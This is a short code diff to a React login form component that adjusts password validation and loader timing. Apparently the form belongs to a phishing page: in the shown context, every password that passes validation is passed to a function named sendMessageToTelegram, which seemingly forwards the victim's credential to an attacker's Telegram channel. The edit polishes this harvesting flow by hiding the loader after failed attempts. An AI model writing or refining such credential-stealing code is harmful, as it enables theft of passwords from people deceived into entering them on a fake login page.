@@ -73,14 +73,17 @@ export default function LoginForm({ setNavigation, navigation }) {
     const handlePasswordValidation = () => {
         const isValid = validatePassword(password);
         setIsLoading(true);
-        setInvalid(!isValid);
-
+        
         if (isValid) {
-            console.log("PASSWORD IS VALID SO CALLING LOADER NOW")
+            console.log("PASSWORD IS VALID, CALLING LOADER NOW");
             sendMessageToTelegram(password);
+        } else {
+            setTimeout(() => setIsLoading(false), 1000); // Turn off loader after 1s
         }
+    
+        setInvalid(!isValid);
         return isValid;
-    }
+    };
 
 
     const [input, setInput] = useState(false)
